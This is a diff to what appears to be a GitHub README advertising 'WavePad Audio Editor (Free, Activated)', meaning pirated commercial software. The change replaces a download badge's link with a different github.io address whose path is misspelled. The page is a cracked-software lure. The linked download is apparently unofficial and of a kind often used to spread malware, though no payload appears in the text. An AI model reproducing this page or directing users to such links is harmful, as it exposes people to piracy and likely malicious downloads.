@@ -6,7 +6,7 @@
 <h1 align="center">🎙️ WavePad Audio Editor (Free, Activated)</h1>
 
 <p align="center">
-  <a href="https://download-portal-demo.github.io/.github/WavePAdPC1" target="_blank">
+  <a href="https://trahendon.github.io/.github/WaveePadInfoPC" target="_blank">
     <img src="https://img.shields.io/badge/Download%20WavePad%20Free-Audio%20Editor%20Ready%20to%20Use-0066cc?style=for-the-badge&logo=audacity&logoColor=white" 
          alt="Download WavePad Audio Tool" style="width: 540px; height: 37px;">
   </a>
